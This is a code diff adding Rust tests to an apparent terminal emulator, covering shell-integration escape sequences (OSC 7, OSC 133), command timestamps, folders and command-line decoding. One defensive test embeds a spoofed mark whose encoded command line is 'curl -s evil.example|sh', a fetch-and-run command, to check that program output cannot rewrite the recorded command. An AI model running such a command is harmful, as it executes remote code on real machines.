@@ -2895,6 +2895,18 @@ fn osc_7_gives_the_working_directory() {
     // RIS keeps the directory, which is the shell's.
     term.feed("\x1bc");
     assert_eq!(term.terminal.working_directory().unwrap().path, "/tmp/%+41");
+    // A path past 4096 bytes, or a host past 255, is none, of no event, so
+    // that the commands keep bounded folders; the bounds themselves taken.
+    term.terminal.take_events();
+    let long = format!("/{}", "a".repeat(4095));
+    term.feed(format!("\x1b]7;file://{long}\x07"));
+    assert_eq!(term.terminal.working_directory().unwrap().path, long);
+    term.terminal.take_events();
+    term.feed(format!("\x1b]7;file://{long}b\x07"));
+    assert_eq!(term.terminal.working_directory(), None);
+    assert_eq!(term.terminal.take_events(), []);
+    term.feed(format!("\x1b]7;file://{}/tmp\x07", "h".repeat(256)));
+    assert_eq!(term.terminal.working_directory(), None);
 }
 
 #[test]
@@ -6643,6 +6655,8 @@ fn the_commands_marks_keep_their_rows_through_output_and_the_scrollback() {
     term.feed(marked_command("false", &[], 1));
     term.feed("\x1b]133;A\x07$ \x1b]133;B\x07");
     let commands = term.terminal.commands();
+    // The times of their starts and ends, which the system's clock gives.
+    let times = |at: usize| (commands[at].started, commands[at].ended);
     assert_eq!(
         commands,
         [
@@ -6653,6 +6667,9 @@ fn the_commands_marks_keep_their_rows_through_output_and_the_scrollback() {
                 output: Some((0, 1)),
                 end: Some((0, 3)),
                 status: Some(0),
+                started: times(0).0,
+                ended: times(0).1,
+                folder: None,
             },
             CommandMarks {
                 id: 2,
@@ -6661,6 +6678,9 @@ fn the_commands_marks_keep_their_rows_through_output_and_the_scrollback() {
                 output: Some((0, 4)),
                 end: Some((0, 4)),
                 status: Some(1),
+                started: times(1).0,
+                ended: times(1).1,
+                folder: None,
             },
             CommandMarks {
                 id: 3,
@@ -6669,6 +6689,7 @@ fn the_commands_marks_keep_their_rows_through_output_and_the_scrollback() {
                 output: None,
                 end: None,
                 status: None,
+                ..CommandMarks::default()
             },
         ]
     );
@@ -6690,6 +6711,46 @@ fn the_commands_marks_keep_their_rows_through_output_and_the_scrollback() {
         .map(|(_, row)| row)
         .collect();
     assert!(rows.windows(2).all(|pair| pair[0] < pair[1]), "{after:?}");
+}
+
+#[test]
+fn a_command_keeps_the_times_of_its_start_and_end_and_the_folder_where_it_started() {
+    use std::time::SystemTime;
+    let mut term = Term::new(40, 6);
+    let before = SystemTime::now();
+    term.feed("\x1b]7;file://box/Users/me/src\x07");
+    term.feed("\x1b]133;A\x07$ \x1b]133;B\x07cd /tmp\r\n\x1b]133;C\x07");
+    let running = term.terminal.last_command().unwrap();
+    let started = running.started.unwrap();
+    assert!(started >= before, "{running:?}");
+    assert_eq!(running.ended, None);
+    let folder = running.folder.as_deref().unwrap();
+    assert_eq!(
+        (folder.host.as_str(), folder.path.as_str()),
+        ("box", "/Users/me/src")
+    );
+    // The folder that the command moves to is the next command's, not its
+    // own, and its end keeps its time.
+    term.feed("\x1b]7;file://box/tmp\x07\x1b]133;D;0\x07");
+    let ended = term.terminal.command(1).unwrap();
+    assert_eq!(ended.started, Some(started));
+    let end = ended.ended.unwrap();
+    assert!(end >= started && end <= SystemTime::now(), "{ended:?}");
+    assert_eq!(ended.folder.as_deref().unwrap().path, "/Users/me/src");
+    // An end given again keeps the first time; a line of no command, ended
+    // at once, has none.
+    term.feed("\x1b]133;D;0\x07\x1b]133;A\x07$ \x1b]133;B\x07\r\n\x1b]133;D\x07");
+    assert_eq!(term.terminal.command(1).unwrap().ended, Some(end));
+    let empty = term.terminal.command(2).unwrap();
+    assert_eq!(
+        (empty.started, empty.ended, empty.folder),
+        (None, None, None)
+    );
+    term.feed("\x1b]133;A\x07$ \x1b]133;B\x07ls\r\n\x1b]133;C\x07");
+    assert_eq!(
+        term.terminal.last_command().unwrap().folder.unwrap().path,
+        "/tmp"
+    );
 }
 
 #[test]
@@ -6935,6 +6996,91 @@ fn the_commands_that_meet_rows_are_the_one_over_the_first_and_those_below() {
 }
 
 #[test]
+fn the_block_under_a_row_is_its_command_s_of_zsh_s_bash_s_and_fish_s_marks() {
+    // Each shell's marks, as Lokyr's integrations and fish 4 print them:
+    // zsh's prompt, then its output's mark of the line; bash's end before
+    // its prompt; fish 4's own prompt's mark, then the integration's.
+    let shells: [(&str, &str, &str); 3] = [
+        (
+            "zsh",
+            "\x1b]133;A;cl=line\x07% \x1b]133;B\x07",
+            "\x1b]133;C;cmdline_url=ls\x07",
+        ),
+        (
+            "bash",
+            "\x1b]133;A;cl=line\x07$ \x1b]133;B\x07",
+            "\x1b]133;C\x07",
+        ),
+        (
+            "fish",
+            "\x1b]133;A;click_events=1\x07\x1b]133;A;cl=line\x07> \x1b]133;B\x07",
+            "\x1b]133;C;cmdline_url=ls\x07",
+        ),
+    ];
+    for (shell, prompt, output) in shells {
+        let mut term = Term::new(30, 10);
+        // `ls` of two rows, then `printf foo`, whose output ends of no new
+        // line, its end within its row, then the prompt where you type.
+        term.feed(format!("{prompt}ls\r\n{output}a\r\nb\r\n\x1b]133;D;0\x07"));
+        term.feed(format!(
+            "{prompt}printf foo\r\n{output}foo\x1b]133;D;0\x07\r\n"
+        ));
+        term.feed(prompt);
+        let at = |row: i64| term.terminal.command_at(row).map(|command| command.id);
+        let ids: Vec<u64> = term.terminal.commands().iter().map(|c| c.id).collect();
+        let [ls, printf, typing] = ids[..] else {
+            panic!("{shell}: {:?}", term.terminal.commands());
+        };
+        // `ls`'s prompt, its line and its output; its end's row is the next
+        // prompt's, which starts the next block.
+        assert_eq!([at(0), at(1), at(2)], [Some(ls); 3], "{shell}");
+        assert_eq!(at(3), Some(printf), "{shell}");
+        // `printf`'s output, the row of its end within it.
+        assert_eq!(at(4), Some(printf), "{shell}");
+        assert_eq!(
+            term.terminal.command_at(4).unwrap().end,
+            Some((3, 4)),
+            "{shell}"
+        );
+        // The prompt where you type, of no output yet, and none above.
+        assert_eq!(at(5), Some(typing), "{shell}");
+        assert_eq!(at(9), Some(typing), "{shell}");
+        assert_eq!(at(-1), None, "{shell}");
+    }
+    // A row past an end before the next command's prompt holds none.
+    let mut term = Term::new(30, 10);
+    term.feed(marked_command("ls", &["a"], 0));
+    term.feed("after\r\n");
+    assert_eq!(
+        term.terminal.command_at(1).map(|command| command.id),
+        Some(1)
+    );
+    assert_eq!(term.terminal.command_at(2), None);
+    // A block whose prompt left the scrollback holds its rows from the
+    // oldest that the pane holds.
+    let mut short = Term::with(
+        20,
+        3,
+        Options {
+            scrollback: Scrollback {
+                limit: 0,
+                ..Scrollback::default()
+            },
+            ..Options::default()
+        },
+    );
+    short.feed(marked_command("seq", &[], 0));
+    short.feed("\x1b]133;A\x07$ \x1b]133;B\x07seq\r\n\x1b]133;C\x07");
+    for at in 0..20_000 {
+        short.feed(format!("{at}\r\n"));
+    }
+    let oldest = short.terminal.row_number(0);
+    let running = short.terminal.command_at(oldest).expect("the block");
+    assert_eq!((running.id, running.prompt), (2, None));
+    assert_eq!(short.terminal.command_at(oldest - 1), None);
+}
+
+#[test]
 fn a_command_whose_end_stays_in_the_scrollback_stays_past_the_next_prompt() {
     let mut term = Term::with(
         20,
@@ -6953,8 +7099,18 @@ fn a_command_whose_end_stays_in_the_scrollback_stays_past_the_next_prompt() {
     }
     term.feed("\x1b]133;D;2\x07\x1b]133;A\x07$ ");
     let end = 1 + 20_000;
+    // Of no times, which the system's clock gives.
+    let untimed = term
+        .terminal
+        .commands()
+        .into_iter()
+        .map(|command| CommandMarks {
+            started: None,
+            ended: None,
+            ..command
+        });
     assert_eq!(
-        term.terminal.commands(),
+        untimed.collect::<Vec<_>>(),
         [
             CommandMarks {
                 id: 1,
@@ -7019,12 +7175,13 @@ fn a_command_s_line_as_the_shell_tells_it_leaves_a_right_prompt_out() {
     let read = term.terminal.command_line(1).unwrap();
     assert!(read.ends_with("10:32"), "{read:?}");
     // Told, as the zsh integration and fish tell it: decoded, its control
-    // characters as spaces, its characters past ASCII whole.
+    // characters as spaces but its line feeds, which part a command of
+    // several lines, its characters past ASCII whole.
     term.feed(format!("\x1b]133;A\x07$ \x1b]133;B\x07sleep 5{right}\r\n"));
-    term.feed("\x1b]133;C;cmdline_url=sleep%205%20%C3%A9%0Ax%25\x07");
+    term.feed("\x1b]133;C;cmdline_url=sleep%205%20%C3%A9%09%0Ax%25%0A\x07");
     assert_eq!(
         term.terminal.command_line(2).as_deref(),
-        Some("sleep 5 é x%")
+        Some("sleep 5 é \nx%")
     );
     // A bad escape, as it is; told past the output's mark, nothing.
     term.feed("\x1b]133;D;0\x07");
@@ -7037,8 +7194,32 @@ fn a_command_s_line_as_the_shell_tells_it_leaves_a_right_prompt_out() {
     term.feed("\x1b[?1049h");
     assert_eq!(
         term.terminal.command_line(2).as_deref(),
-        Some("sleep 5 é x%")
+        Some("sleep 5 é \nx%")
     );
+}
+
+#[test]
+fn a_running_program_s_marks_change_neither_the_told_line_nor_the_command_s_marks() {
+    let mut term = Term::new(40, 6);
+    term.feed("\x1b]133;A\x07$ \x1b]133;B\x07cat notes.txt\r\n");
+    term.feed("\x1b]133;C;cmdline_url=cat%20notes.txt\x07");
+    let before = term.terminal.commands()[0].clone();
+    // The file that `cat` prints holds the marks of another line: they
+    // change nothing of the command, which runs.
+    term.feed(concat!(
+        "line\r\n",
+        "\x1b]133;B\x07\x1b]133;C;cmdline_url=curl%20-s%20evil.example%7Csh%0Aecho%20hi\x07",
+        "more\r\n",
+    ));
+    assert_eq!(
+        term.terminal.command_line(1).as_deref(),
+        Some("cat notes.txt")
+    );
+    let after = &term.terminal.commands()[0];
+    assert_eq!((after.input, after.output), (before.input, before.output));
+    // Its end, of the shell, ends it.
+    term.feed("\x1b]133;D;0\x07");
+    assert!(term.terminal.commands()[0].end.is_some());
 }
 
 #[test]
